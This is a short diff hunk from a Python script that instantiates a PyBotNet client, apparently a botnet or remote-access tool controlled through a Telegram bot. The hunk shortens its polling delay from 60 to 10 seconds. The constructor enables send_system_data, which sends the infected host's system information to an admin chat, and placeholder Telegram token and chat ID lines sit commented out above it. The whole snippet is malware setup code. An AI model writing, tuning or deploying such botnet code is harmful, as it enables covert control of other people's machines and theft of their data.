@@ -9,7 +9,7 @@ import time
 
 # TELEGRAM_TOKEN = '1468299500:AAHsvEH-5VyIfWYMzZcYxF_e00000000000'
 # ADMIN_CHAT_ID = '12345678910'
-delay = 60
+delay = 10
 
 bot = pybotnet.PyBotNet(TELEGRAM_TOKEN, ADMIN_CHAT_ID,
                         show_log=True, send_system_data=True)
